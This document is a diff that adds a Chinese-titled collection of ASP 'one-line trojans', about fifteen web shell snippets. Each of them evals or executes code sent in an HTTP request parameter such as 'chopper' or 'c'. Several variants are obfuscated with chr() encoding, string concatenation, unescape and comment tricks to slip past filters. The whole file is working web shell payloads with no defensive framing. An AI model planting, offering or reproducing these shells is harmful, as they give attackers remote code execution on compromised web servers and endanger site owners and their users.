@@ -1,0 +1,31 @@
+ASP一句话木马收集：
+
+<%eval request("chopper")%>
+
+<%execute request("chopper")%>
+
+<%execute(request("chopper"))%>
+
+<%ExecuteGlobal request("chopper")%>
+
+<%Eval(Request(chr(35)))%>
+
+<%dy=request("c")%><%Eval(dy)%> 
+
+<%if request ("c")<>""then session("c")=request("c"):end if:if session("c")<>"" then execute session("c")%> 
+
+<% if Request("c")<>"" then ExecuteGlobal request("c") end if %>
+
+<%execute request("c")%><%'<% loop <%:%>
+
+< %'<% loop <%:%><%execute request("a")%>
+
+<script language=vbs runat=server>eval(request("c"))</script> 
+
+<script language=VBScript runat=server>execute request("#")</script> 
+
+<%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("c"))%>
+
+<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>
+
+<%execute(unescape("eval%20request%28%22aaa%22%29"))%>
